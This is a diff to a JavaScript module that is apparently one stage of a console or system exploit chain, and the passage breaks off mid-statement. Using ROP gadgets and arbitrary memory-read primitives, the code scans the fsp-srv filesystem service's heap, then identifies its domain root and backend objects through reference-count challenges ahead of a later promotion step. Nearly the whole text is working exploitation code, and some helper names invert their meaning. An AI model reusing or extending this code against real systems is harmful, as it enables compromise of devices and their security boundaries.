@@ -1,34 +1,41 @@
 import coreRuntime from "../runtime.mjs";
-import {hasByteDifferentFast, readFsAddressBytes} from "./util.mjs";
+import {hasByteDifferentFast, isSafeCacheTail, readFsAddressBytes} from "./util.mjs";
 
 const {
-  AnalysisBytes,
-  GADGET_MEMSET,
-  RootLayout,
-  allocPage,
-  call_rop,
-  cloneObject,
-  closeHandle,
-  hex32,
-  ipcStorageRead,
-  openDomainSession,
-  read32,
-  read64,
-  read8
+    AnalysisBytes,
+    GADGET_MEMSET,
+    RootLayout,
+    allocPage,
+    call_rop,
+    cloneObject,
+    closeHandle,
+    hex32,
+    ipcStorageRead,
+    openDomainSession,
+    read32,
+    read64,
+    read8
 } = coreRuntime;
 
-// ── Root identity inspection ──────────────────────────────────────────────
+// ----- Root identity inspection -----
 
+/**
+ * S19, read side: walk the address plan to the fsp-srv domain root and its two
+ * backend objects, then prove who they are with clone-count and stability
+ * challenges. Nothing gets written; the caller decides what to promote.
+ *
+ * Returns the domain session, the identity snapshots the promotion step needs, and
+ * whether another candidate could still qualify.
+ */
 export async function inspectFspIdentityTargetsReadOnly(input) {
     const config = input.config;
     const optimizeRootCandidateScan = input.optimizeRootCandidateScan === true;
     const collectRootScanTiming = input.collectRootScanTiming === true;
-    let addressPlan = input.addressPlan;
-    let candidateHandle = input.candidateHandle;
+    const addressPlan = input.addressPlan;
+    const candidateHandle = input.candidateHandle;
     let domainSession = input.domainSession;
     let rootCandidateRetryable = input.rootCandidateRetryable;
     let rootPidRead = input.rootPidRead;
-    let rootSession = input.rootSession;
     let verifiedIdentityTargets = input.verifiedIdentityTargets;
     const addressReadInput = {config, addressPlan, candidateHandle};
     let retainedCacheLayout = null;
@@ -42,67 +49,40 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         clearMs: 0, readMs: 0,
         scanMs: 0, chunksRead: 0};
 
-    function unusedCacheTail(bytes, start) {
-        var tail = bytes.slice(start, start + 0x570);
-        if (tail.length !== 0x570) return false;
-        var any = false;
-        for (var i = 0; i < tail.length; i++) any = any || !!tail[i];
-        if (!any) return true;
-        var pathStart;
-        var exactEightBytePath = false;
-        if (tail[0] === 0x41) pathStart = 0;
-        else if (tail[0] === 0 && tail[1] === 0x41) pathStart = 1;
-        else if (AnalysisBytes.toHex(tail, 0, 8) === "0000400100000000") {
-            pathStart = 8;
-            exactEightBytePath = true;
-        } else if (AnalysisBytes.toHex(tail, 0, 5) === "0000400100")
-            pathStart = tail[5] === 0 ? 6 : 5;
-        else return false;
-        var end = -1;
-        for (var ti = pathStart; ti < tail.length; ti++) {
-            if (tail[ti] === 0) { end = ti - pathStart; break; }
-        }
-        if (end <= 0 || (exactEightBytePath && end !== 552)) return false;
-        var hasSlash = false;
-        for (var pi = 0; pi < end; pi++) {
-            var value = tail[pathStart + pi];
-            if (value !== 0x41 && value !== 0x2F) return false;
-            if (value === 0x2F) hasSlash = true;
-        }
-        if (!hasSlash) return false;
-        for (var zi = pathStart + end; zi < tail.length; zi++)
-            if (tail[zi] !== 0) return false;
-        return true;
-    }
 
     function rememberRetainedArray(address, bytes, offset) {
-        if (offset < 0 || offset + 0x5A0 > bytes.length ||
-            AnalysisBytes.readU64LE(bytes, offset) !== retainedHeader0 ||
-            AnalysisBytes.readU64LE(bytes, offset + 8) !== retainedHeader1 ||
-            bytes[offset + 0x10] !== 0 ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x18) !== 0n ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x20) !== 0n ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0n ||
-            !unusedCacheTail(bytes, offset + 0x30)) return;
+        if (isRetainedArrayRecord(bytes, offset)) {
+            return;
+        }
+
         var key = address.toString(16);
-        if (retainedArraySeen[key]) return;
+
+        if (retainedArraySeen[key]) {
+            return;
+        }
+
         retainedArraySeen[key] = true;
         retainedArrays.push({address, bytes: bytes.slice(offset, offset + 0x5A0)});
     }
 
     function rememberRetainedOwner(address, bytes, offset) {
-        if (offset < 0 || offset + 0x78 > bytes.length ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x20) !==
-                BigInt(addressPlan.storageSize) ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0x4000n ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x50) !== 0x5A0n ||
-            AnalysisBytes.readU32LE(bytes, offset + 0x58) !== 10 ||
-            AnalysisBytes.readU64LE(bytes, offset + 0x60) !== 14n) return;
+        if (isRetainedOwnerRecord(bytes, offset)) {
+            return;
+        }
+
         var array = AnalysisBytes.readU64LE(bytes, offset + 0x48);
+
         if (array < 0x100000000n || array >= 0x8000000000n ||
-            array % 8n !== 0n) return;
+            array % 8n !== 0n) {
+            return;
+        }
+
         var key = address.toString(16);
-        if (retainedOwnerSeen[key]) return;
+
+        if (retainedOwnerSeen[key]) {
+            return;
+        }
+
         retainedOwnerSeen[key] = true;
         retainedOwners.push({address, array: Number(array),
             bytes: bytes.slice(offset, offset + 0x78)});
@@ -110,11 +90,14 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
 
     function copyNativeBytes(pointer, length) {
         var bytes = new Array(length);
+
         if (!optimizeRootCandidateScan) {
-            for (var i = 0; i < length; i++)
+            for (var i = 0; i < length; i++) {
                 bytes[i] = Number(read8(pointer + BigInt(i)));
+            }
             return bytes;
         }
+
         var wordEnd = length - length % 8;
         for (var wordOffset = 0; wordOffset < wordEnd; wordOffset += 8) {
             var word = read64(pointer + BigInt(wordOffset));
@@ -123,57 +106,66 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
                 word >>= 8n;
             }
         }
-        for (var tailOffset = wordEnd; tailOffset < length; tailOffset++)
+        for (var tailOffset = wordEnd; tailOffset < length; tailOffset++) {
             bytes[tailOffset] = Number(read8(pointer + BigInt(tailOffset)));
+        }
         return bytes;
     }
 
+
     function scanRetainedNativeChunk(buffer, chunkAddress, scanArrays) {
         var chunkLength = config.ROOT_CAPTURE_CHUNK;
+
         if (scanArrays) {
             for (var offset = 0; offset + 0x5A0 <= chunkLength; offset += 8) {
-                if (read64(buffer + BigInt(offset)) !== retainedHeader0 ||
-                    read64(buffer + BigInt(offset + 8)) !== retainedHeader1 ||
-                    Number(read8(buffer + BigInt(offset + 0x10))) !== 0 ||
-                    read64(buffer + BigInt(offset + 0x18)) !== 0n ||
-                    read64(buffer + BigInt(offset + 0x20)) !== 0n ||
-                    read64(buffer + BigInt(offset + 0x28)) !== 0n) continue;
+                if (hasInvalidNativeRetainedArrayHeader(buffer, offset)) {
+                    continue;
+                }
+
                 var tail = copyNativeBytes(buffer + BigInt(offset + 0x30), 0x570);
-                // Reuse the exact reference tail-shape guard on a compact local view.
+                // Reuse the reference tail-shape guard exactly, on a compact local view.
                 var candidate = new Array(0x5A0);
-                for (var ti = 0; ti < tail.length; ti++)
+                for (var ti = 0; ti < tail.length; ti++) {
                     candidate[0x30 + ti] = tail[ti];
-                if (!unusedCacheTail(candidate, 0x30)) continue;
+                }
+
+                if (!isSafeCacheTail(candidate, 0x30)) {
+                    continue;
+                }
+
                 rememberRetainedArray(chunkAddress + offset, [
                     ...copyNativeBytes(buffer + BigInt(offset), 0x30), ...tail
                 ], 0);
             }
         }
+
         for (var ownerOffset = 0; ownerOffset + 0x78 <= chunkLength;
             ownerOffset += 8) {
-            if (read64(buffer + BigInt(ownerOffset + 0x20)) !==
-                    BigInt(addressPlan.storageSize) ||
-                read64(buffer + BigInt(ownerOffset + 0x28)) !== 0x4000n ||
-                read64(buffer + BigInt(ownerOffset + 0x50)) !== 0x5A0n ||
-                Number(read32(buffer + BigInt(ownerOffset + 0x58))) !== 10 ||
-                read64(buffer + BigInt(ownerOffset + 0x60)) !== 14n) continue;
+            if (hasInvalidNativeRetainedOwnerHeader(buffer, ownerOffset)) {
+                continue;
+            }
+
             var ownerBytes = copyNativeBytes(buffer + BigInt(ownerOffset), 0x78);
             rememberRetainedOwner(chunkAddress + ownerOffset,
-                ownerBytes, 0);
+                                  ownerBytes, 0);
         }
     }
 
-    function scanRetainedBoundary(previousTail, previousStart, buffer,
-        chunkAddress) {
-        if (!previousTail || previousTail.length !== 0x5A0) return;
+    function scanRetainedBoundary(previousTail, previousStart, buffer) {
+        if (!previousTail || previousTail.length !== 0x5A0) {
+            return;
+        }
+
         var boundary = previousTail.concat(copyNativeBytes(buffer, 0x5A0));
-        for (var offset = 0; offset < 0x5A0; offset += 8)
+        for (var offset = 0; offset < 0x5A0; offset += 8) {
             rememberRetainedArray(previousStart + offset, boundary, offset);
+        }
         var ownerStart = 0x5A0 - 0x78;
         for (var ownerOffset = ownerStart; ownerOffset < 0x5A0;
-            ownerOffset += 8)
+            ownerOffset += 8) {
             rememberRetainedOwner(previousStart + ownerOffset, boundary,
-                ownerOffset);
+                                  ownerOffset);
+        }
     }
 
     const lookupResult = (ok) => ({ok,
@@ -190,15 +182,18 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         } : null});
     rootCandidateRetryable = false;
     var opened = openDomainSession();
+
     if (!opened) {
         return lookupResult(false);
     }
+
     domainSession = opened;
     var cloneHandles = [];
     var verified = false;
 
     try {
         var domainId = Number(opened.rootObj) >>> 0;
+
         if (domainId === 0 || domainId > 0x4000) {
             return lookupResult(false);
         }
@@ -210,23 +205,18 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         var startOffset = captureStart - Number(addressPlan.addressBias);
         var periodRemainder = Number(addressPlan.readOffset) % config.ROOT_CAPTURE_CHUNK;
 
-        if (!Number.isSafeInteger(anchor) || !Number.isSafeInteger(captureStart) ||
-            captureStart < 0x100000000 || captureEnd !== anchor - config.ROOT_CAPTURE_GAP ||
-            !addressPlan.lowerWindow || addressPlan.lowerWindow.prefix < config.ROOT_CAPTURE_BACK ||
-            captureStart < lowerStart || captureEnd > anchor || startOffset < 0 ||
-            startOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
-            Math.floor(startOffset / config.CONTROL_SIZE) * config.CONTROL_SIZE %
-                config.ROOT_CAPTURE_CHUNK !== 0 ||
-            startOffset + config.ROOT_CAPTURE_SIZE > addressPlan.storageSize ||
-            config.ROOT_CAPTURE_CHUNKS !== 31) {
+        if (isInvalidRootCaptureRange(anchor, captureStart, captureEnd,
+                                      lowerStart, startOffset, periodRemainder, addressPlan, config)) {
             return lookupResult(false);
         }
 
 
         var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
+
         if (!captureBuf) {
             return lookupResult(false);
         }
+
         var domainCandidates = [];
         var domainCandidateSeen = {};
         var carry = null;
@@ -240,6 +230,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             var chunkAddress = captureStart + chunkIndex * config.ROOT_CAPTURE_CHUNK;
             var bucketStart = Math.floor(chunkOffset / config.CONTROL_SIZE) *
                 config.CONTROL_SIZE;
+
             if (bucketStart % config.ROOT_CAPTURE_CHUNK !== 0 ||
                 chunkOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
                 chunkOffset + config.ROOT_CAPTURE_CHUNK > addressPlan.storageSize) {
@@ -248,33 +239,48 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
 
             var clearStartedAt = collectRootScanTiming ? Date.now() : 0;
             call_rop(GADGET_MEMSET, captureBuf, 0xA5n,
-                BigInt(config.ROOT_CAPTURE_CHUNK));
-            if (collectRootScanTiming)
+                     BigInt(config.ROOT_CAPTURE_CHUNK));
+
+            if (collectRootScanTiming) {
                 rootTiming.clearMs += Date.now() - clearStartedAt;
+            }
+
             var readStartedAt = collectRootScanTiming ? Date.now() : 0;
             var captureReply = ipcStorageRead(candidateHandle, chunkOffset,
-                config.ROOT_CAPTURE_CHUNK, captureBuf);
-            if (collectRootScanTiming)
+                                              config.ROOT_CAPTURE_CHUNK, captureBuf);
+
+            if (collectRootScanTiming) {
                 rootTiming.readMs += Date.now() - readStartedAt;
+            }
+
             if (captureReply.error !== 0) {
                 return lookupResult(false);
             }
-            if (collectRootScanTiming) rootTiming.chunksRead++;
+
+            if (collectRootScanTiming) {
+                rootTiming.chunksRead++;
+            }
+
             var scanStartedAt = collectRootScanTiming ? Date.now() : 0;
+
             if (!hasByteDifferentFast(captureBuf,
-                    config.ROOT_CAPTURE_CHUNK, 0xA5)) {
-                if (collectRootScanTiming)
+                                      config.ROOT_CAPTURE_CHUNK, 0xA5)) {
+                if (collectRootScanTiming) {
                     rootTiming.scanMs += Date.now() - scanStartedAt;
+                }
+
                 return lookupResult(false);
             }
 
             scanRetainedBoundary(retainedBoundaryTail,
-                retainedBoundaryAddress, captureBuf, chunkAddress);
-            if (!optimizeRootCandidateScan)
+                                 retainedBoundaryAddress, captureBuf);
+
+            if (!optimizeRootCandidateScan) {
                 scanRetainedNativeChunk(captureBuf, chunkAddress, true);
-            retainedBoundaryTail = copyNativeBytes(
-                captureBuf + BigInt(config.ROOT_CAPTURE_CHUNK - 0x5A0),
-                0x5A0);
+            }
+
+            retainedBoundaryTail = copyNativeBytes(captureBuf + BigInt(config.ROOT_CAPTURE_CHUNK - 0x5A0),
+                                                   0x5A0);
             retainedBoundaryAddress = chunkAddress +
                 config.ROOT_CAPTURE_CHUNK - 0x5A0;
 
@@ -294,14 +300,17 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             carry = captureDomainTail({buffer: captureBuf, chunkAddress,
                 config, copyNativeBytes});
             captureChunksDone++;
-            if (collectRootScanTiming)
+
+            if (collectRootScanTiming) {
                 rootTiming.scanMs += Date.now() - scanStartedAt;
+            }
+
             var progressChunk = Math.ceil(config.ROOT_CAPTURE_CHUNKS / 2);
+
             if (captureChunksDone === progressChunk &&
                 typeof input.reportProgress === "function") {
                 await input.reportProgress("FSP root capture and scan in progress: " +
-                    captureChunksDone + "/" + config.ROOT_CAPTURE_CHUNKS +
-                    " chunks; wrappers=" + domainCandidates.length +
+                    captureChunksDone + "/" + config.ROOT_CAPTURE_CHUNKS + " chunks; wrappers=" + domainCandidates.length +
                     "; cache arrays/owners=" + retainedArrays.length + "/" +
                     retainedOwners.length + ".");
             }
@@ -316,11 +325,13 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
                 retainedArrayIndex < retainedArrays.length;
                 retainedArrayIndex++) {
                 var retainedArray = retainedArrays[retainedArrayIndex];
-                if (retainedOwner.array === retainedArray.address)
+
+                if (retainedOwner.array === retainedArray.address) {
                     retainedPairs.push({array: retainedArray.address,
                         owner: retainedOwner.address,
                         arrayBytes: retainedArray.bytes,
                         ownerBytes: retainedOwner.bytes});
+                }
             }
         }
         var retainedPairMap = Object.create(null);
@@ -332,38 +343,47 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
                 retainedPair.owner.toString(16)] = retainedPair;
         }
         var retainedPairKeys = Object.keys(retainedPairMap);
-        if (retainedPairKeys.length === 1)
+
+        if (retainedPairKeys.length === 1) {
             retainedCacheLayout = {...retainedPairMap[retainedPairKeys[0]],
                 captureStart, captureEnd};
+        }
 
         var groups = RootLayout.groupDomainCandidates(domainCandidates);
 
         var tableMatches = [];
         for (var gi = 0; gi < groups.length; gi++) {
             var group = groups[gi];
+
             if (!RootLayout.rangeContains(captureStart, config.ROOT_CAPTURE_SIZE,
-                    group.manager, 0x20)) {
+                                          group.manager, 0x20)) {
                 continue;
             }
 
             var managerRead = await readFsAddressBytes({...addressReadInput,
                 address: group.manager, length: 0x20, outputBuf: captureBuf});
+
             if (!managerRead.ok) {
                 if (managerRead.fatal) {
                     return lookupResult(false);
                 }
+
                 continue;
             }
+
             var managerCount = AnalysisBytes.readU32LE(managerRead.bytes, 0x10);
             var tablePointer = AnalysisBytes.readU64LE(managerRead.bytes, 0x18);
             var managerCapacityOk = managerCount === 0x4000;
             var tablePointerCanonical = RootLayout.isCanonicalPointer(tablePointer);
+
             if (!managerCapacityOk || !tablePointerCanonical) {
                 continue;
             }
+
             var table = Number(tablePointer);
             var tableInCapture = RootLayout.rangeContains(captureStart,
-                config.ROOT_CAPTURE_SIZE, table, 0x4000);
+                                                          config.ROOT_CAPTURE_SIZE, table, 0x4000);
+
             if (!tableInCapture) {
                 continue;
             }
@@ -371,21 +391,25 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             var entryIndex = domainId - 1;
             var entryAddress = table + entryIndex * 0x30;
             var entryInCapture = RootLayout.rangeContains(captureStart,
-                config.ROOT_CAPTURE_SIZE, entryAddress, 0x30);
+                                                          config.ROOT_CAPTURE_SIZE, entryAddress, 0x30);
             var entryInTable = entryAddress >= table &&
                 entryAddress + 0x30 <= table + managerCount * 0x30;
+
             if (!entryInCapture || !entryInTable) {
                 continue;
             }
 
             var entryRead = await readFsAddressBytes({...addressReadInput,
                 address: entryAddress, length: 0x30, outputBuf: captureBuf});
+
             if (!entryRead.ok) {
                 if (entryRead.fatal) {
                     return lookupResult(false);
                 }
+
                 continue;
             }
+
             var entryDomain = AnalysisBytes.readU64LE(entryRead.bytes, 0x18);
             var objectAddress = AnalysisBytes.readU64LE(entryRead.bytes, 0x20);
             var domainCandidate = null;
@@ -397,6 +421,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             }
             var domainAddressMatched = !!domainCandidate;
             var objectPointerCanonical = RootLayout.isCanonicalPointer(objectAddress);
+
             if (!domainAddressMatched || !objectPointerCanonical) {
                 continue;
             }
@@ -404,12 +429,15 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             var wrapperRead = await readFsAddressBytes({...addressReadInput,
                 address: domainCandidate.address, length: 0x20,
                 outputBuf: captureBuf});
+
             if (!wrapperRead.ok) {
                 if (wrapperRead.fatal) {
                     return lookupResult(false);
                 }
+
                 continue;
             }
+
             var wrapperVptr0 = AnalysisBytes.readU64LE(wrapperRead.bytes, 0);
             var wrapperVptr1 = AnalysisBytes.readU64LE(wrapperRead.bytes, 8);
             var wrapperManager = AnalysisBytes.readU64LE(wrapperRead.bytes, 0x18);
@@ -418,6 +446,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             var wrapperVptr0Matched = wrapperVptr0 === expectedWrapperVptr0;
             var wrapperVptr1Matched = wrapperVptr1 === expectedWrapperVptr1;
             var wrapperManagerMatched = wrapperManager === BigInt(group.manager);
+
             if (!wrapperVptr0Matched || !wrapperVptr1Matched ||
                 !wrapperManagerMatched) {
                 continue;
@@ -430,9 +459,12 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         }
 
         if (tableMatches.length !== 1) {
-            // The address read itself was valid, but this capture did not
-            // identify one table entry for the session's domain ID. A later
-            // bounded candidate capture may cover the correct heap region.
+
+            /*
+             * The address read itself was valid, but this capture found no table
+             * entry for the session's domain id. A later bounded candidate capture
+             * may still cover the right heap region.
+             */
             rootCandidateRetryable = true;
             return lookupResult(false);
         }
@@ -441,13 +473,19 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
 
         var rootRead = await readFsAddressBytes({...addressReadInput,
             address: located.object, length: 0x40, outputBuf: captureBuf});
+
         if (!rootRead.ok) {
-            if (!rootRead.fatal) rootCandidateRetryable = true;
+            if (!rootRead.fatal) {
+                rootCandidateRetryable = true;
+            }
+
             return lookupResult(false);
         }
+
         var rootBytes = rootRead.bytes;
         var rootObjectVptr = AnalysisBytes.readU64LE(rootBytes, 0);
         var rootRefCount = AnalysisBytes.readU32LE(rootBytes, 0x38);
+
         if (rootObjectVptr !== BigInt(located.rootVptr) ||
             rootRefCount === 0 || rootRefCount >= 0x1000000) {
             rootCandidateRetryable = true;
@@ -460,16 +498,21 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         var challengeOnlyCounter = false;
         var challengeRestored = false;
         var cloneCloseOk = true;
-        if (expectedCount > 0xFFFFFFFF) cloneOpened = false;
+
+        if (expectedCount > 0xFFFFFFFF) {
+            cloneOpened = false;
+        }
 
         try {
             if (cloneOpened) {
                 for (var cloneIndex = 0; cloneIndex < 3; cloneIndex++) {
                     var cloneHandle = cloneObject(opened.handle, domainId);
+
                     if (!cloneHandle) {
                         cloneOpened = false;
                         break;
                     }
+
                     cloneHandles.push(cloneHandle);
                 }
             }
@@ -478,11 +521,12 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
                 var duringRead = await readFsAddressBytes({...addressReadInput,
                     address: located.object, length: 0x40,
                     outputBuf: captureBuf});
+
                 if (duringRead.ok) {
                     var expectedDuring = liveBaseline.slice();
                     AnalysisBytes.writeU32LE(expectedDuring, 0x38, expectedCount);
                     challengeOnlyCounter = AnalysisBytes.equal(duringRead.bytes,
-                        expectedDuring);
+                                                               expectedDuring);
                 }
             }
         } finally {
@@ -491,8 +535,8 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             for (var closeIndex = cloneHandles.length - 1;
                 closeIndex >= 0; closeIndex--) {
                 var challengedHandle = cloneHandles[closeIndex];
-                var closeResult = Number(closeHandle(
-                    challengedHandle)) >>> 0;
+                var closeResult = Number(closeHandle(challengedHandle)) >>> 0;
+
                 if (closeResult !== 0) {
                     cloneCloseOk = false;
                     failedCloneCloses.push(hex32(closeResult));
@@ -504,13 +548,16 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
 
         var restoredRead = await readFsAddressBytes({...addressReadInput,
             address: located.object, length: 0x40, outputBuf: captureBuf});
-        if (restoredRead.ok)
+
+        if (restoredRead.ok) {
             challengeRestored = AnalysisBytes.equal(restoredRead.bytes,
-                liveBaseline);
+                                                    liveBaseline);
+        }
 
         if (!challengeRestored || !cloneCloseOk) {
             return lookupResult(false);
         }
+
         if (!challengeOnlyCounter) {
             rootCandidateRetryable = true;
             return lookupResult(false);
@@ -519,6 +566,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         var rootPid = AnalysisBytes.readU64LE(liveBaseline, 0x30);
         rootPidRead = true;
         var rootPidPlausible = rootPid > 1n && rootPid < 0x1000000n;
+
         if (!rootPidPlausible) {
             return lookupResult(false);
         }
@@ -530,15 +578,16 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         var saveRaw = AnalysisBytes.readU64LE(rootBytes, 0x20);
         var saveControl = AnalysisBytes.readU64LE(rootBytes, 0x28);
         backendResults.push(await inspectRootBackend("nca", ncaRaw,
-            ncaControl, 0x20, rootPid, captureBuf, addressReadInput));
+                                                     ncaControl, 0x20, rootPid, captureBuf, addressReadInput));
         backendResults.push(await inspectRootBackend("save", saveRaw,
-            saveControl, 0x28, rootPid, captureBuf, addressReadInput));
+                                                     saveControl, 0x28, rootPid, captureBuf, addressReadInput));
         for (var backendIndex = 0; backendIndex < backendResults.length;
             backendIndex++) {
             var backendResult = backendResults[backendIndex];
-            if (!backendResult.read || !backendResult.linksOk ||
-                !backendResult.vptrShapeOk || !backendResult.pidOk ||
-                !backendResult.stable) backendChecksOk = false;
+
+            if (hasInvalidRootBackendResult(backendResult)) {
+                backendChecksOk = false;
+            }
         }
 
         var rootFinalRead = await readFsAddressBytes({...addressReadInput,
@@ -549,6 +598,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
         verified = rootPidPlausible && challengeOnlyCounter &&
             challengeRestored && cloneCloseOk && rootStable &&
             backendResults.length === 2 && backendChecksOk;
+
         if (verified) {
             verifiedIdentityTargets = {
                 domainId: domainId,
@@ -580,6 +630,7 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
                 ]
             };
         }
+
         return lookupResult(verified);
     } finally {
         if (cloneHandles.length) {
@@ -589,15 +640,80 @@ export async function inspectFspIdentityTargetsReadOnly(input) {
             }
             cloneHandles = [];
         }
+
         if (domainSession && !verified) {
             closeHandle(domainSession.handle);
             domainSession = null;
         }
     }
+
+    function hasInvalidRootBackendResult(result) {
+        return !result.read || !result.linksOk || !result.vptrShapeOk ||
+            !result.pidOk || !result.stable;
+    }
+
+    function isInvalidRootCaptureRange(anchor, captureStart, captureEnd,
+                                       lowerStart, startOffset, periodRemainder, addressPlan, config) {
+        return !Number.isSafeInteger(anchor) ||
+            !Number.isSafeInteger(captureStart) ||
+            captureStart < 0x100000000 ||
+            captureEnd !== anchor - config.ROOT_CAPTURE_GAP ||
+            !addressPlan.lowerWindow ||
+            addressPlan.lowerWindow.prefix < config.ROOT_CAPTURE_BACK ||
+            captureStart < lowerStart || captureEnd > anchor || startOffset < 0 ||
+            startOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
+            Math.floor(startOffset / config.CONTROL_SIZE) *
+                config.CONTROL_SIZE % config.ROOT_CAPTURE_CHUNK !== 0 ||
+            startOffset + config.ROOT_CAPTURE_SIZE > addressPlan.storageSize ||
+            config.ROOT_CAPTURE_CHUNKS !== 31;
+    }
+
+    function isRetainedArrayRecord(bytes, offset) {
+        return offset < 0 || offset + 0x5A0 > bytes.length ||
+            AnalysisBytes.readU64LE(bytes, offset) !== retainedHeader0 ||
+            AnalysisBytes.readU64LE(bytes, offset + 8) !== retainedHeader1 ||
+            bytes[offset + 0x10] !== 0 ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x18) !== 0n ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x20) !== 0n ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0n ||
+            !isSafeCacheTail(bytes, offset + 0x30);
+    }
+
+    function isRetainedOwnerRecord(bytes, offset) {
+        return offset < 0 || offset + 0x78 > bytes.length ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x20) !==
+                BigInt(addressPlan.storageSize) ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0x4000n ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x50) !== 0x5A0n ||
+            AnalysisBytes.readU32LE(bytes, offset + 0x58) !== 10 ||
+            AnalysisBytes.readU64LE(bytes, offset + 0x60) !== 14n;
+    }
+
+    function hasInvalidNativeRetainedArrayHeader(buffer, offset) {
+        return read64(buffer + BigInt(offset)) !== retainedHeader0 ||
+            read64(buffer + BigInt(offset + 8)) !== retainedHeader1 ||
+            Number(read8(buffer + BigInt(offset + 0x10))) !== 0 ||
+            read64(buffer + BigInt(offset + 0x18)) !== 0n ||
+            read64(buffer + BigInt(offset + 0x20)) !== 0n ||
+            read64(buffer + BigInt(offset + 0x28)) !== 0n;
+    }
+
+    function hasInvalidNativeRetainedOwnerHeader(buffer, ownerOffset) {
+        return read64(buffer + BigInt(ownerOffset + 0x20)) !==
+                BigInt(addressPlan.storageSize) ||
+            read64(buffer + BigInt(ownerOffset + 0x28)) !== 0x4000n ||
+            read64(buffer + BigInt(ownerOffset + 0x50)) !== 0x5A0n ||
+            Number(read32(buffer + BigInt(ownerOffset + 0x58))) !== 10 ||
+            read64(buffer + BigInt(ownerOffset + 0x60)) !== 14n;
+    }
 }
 
-// ── Heap-pointer link scanning ────────────────────────────────────────────
+// ----- Heap-pointer link scanning -----
 
+/**
+ * Collect the heap words that point near the seed and sit in front of a zero tail.
+ * The caller merges the links it gets back with its own dedupe set.
+ */
 export function scanNativeLinkBuffer(input) {
     const config = input.config;
     const buffer = input.buffer;
@@ -612,11 +728,18 @@ export function scanNativeLinkBuffer(input) {
     for (var offset = firstOffset; offset + 64 <= length;
         offset += config.CONTROL_SIZE) {
         var valueBig = read64(buffer + BigInt(bufferOffset + offset));
+
         if (valueBig <= 0x100000000n || valueBig >= 0x8000000000n ||
-            valueBig % BigInt(config.CONTROL_SIZE) !== 0n) continue;
-        var value = Number(valueBig);
-        if (!Number.isSafeInteger(value) || Math.abs(value - seed) >= 0x2000000)
+            valueBig % BigInt(config.CONTROL_SIZE) !== 0n) {
             continue;
+        }
+
+        var value = Number(valueBig);
+
+        if (!Number.isSafeInteger(value) || Math.abs(value - seed) >= 0x2000000) {
+            continue;
+        }
+
         var zeroTail = true;
         for (var tail = 8; tail < 64; tail += 8) {
             if (read64(buffer + BigInt(bufferOffset + offset + tail)) !== 0n) {
@@ -626,15 +749,20 @@ export function scanNativeLinkBuffer(input) {
         }
         var source = sourceAddress + offset;
         var key = source.toString(16) + ":" + value.toString(16);
-        if (seen[key]) continue;
+
+        if (seen[key]) {
+            continue;
+        }
+
         seen[key] = true;
         links.push({source: source, value: value, zeroTail: zeroTail});
     }
     return {links, seen};
 }
 
-// ── Root domain table scanning ────────────────────────────────────────────
+// ----- Root domain table scanning -----
 
+/** Scan one captured chunk for domain-wrapper candidates, eight bytes at a time. */
 export function scanRootDomainChunk(input) {
     const config = input.config;
     const buffer = input.buffer;
@@ -649,33 +777,41 @@ export function scanRootDomainChunk(input) {
         var candidateSecond = read64(buffer + BigInt(offset + 8));
         var candidateManager = read64(buffer + BigInt(offset + 0x18));
         var candidate = recordRootDomainCandidate(candidateAddress,
-            candidateFirst, candidateSecond, candidateManager);
+                                                  candidateFirst, candidateSecond, candidateManager);
+
         if (candidate) {
             var key = candidate.address.toString(16) + ":" +
                 candidate.rootVptr.toString(16) + ":" +
                 candidate.manager.toString(16);
-            if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
+
+            if (!seen[key]) {
+                seen[key] = true;
+                candidates.push(candidate);
+            }
         }
     }
 
     if (carry && carry.bytes.length === 0x18) {
         var boundary = carry.bytes.slice();
-        for (var byteIndex = 0; byteIndex < 0x18; byteIndex++)
+        for (var byteIndex = 0; byteIndex < 0x18; byteIndex++) {
             boundary.push(Number(read8(buffer + BigInt(byteIndex))));
+        }
         for (var boundaryOffset = 0; boundaryOffset < 0x18;
             boundaryOffset += 8) {
             var boundaryAddress = carry.address + boundaryOffset;
             var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
             var boundarySecond = AnalysisBytes.readU64LE(boundary,
-                boundaryOffset + 8);
+                                                         boundaryOffset + 8);
             var boundaryManager = AnalysisBytes.readU64LE(boundary,
-                boundaryOffset + 0x18);
+                                                          boundaryOffset + 0x18);
             var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
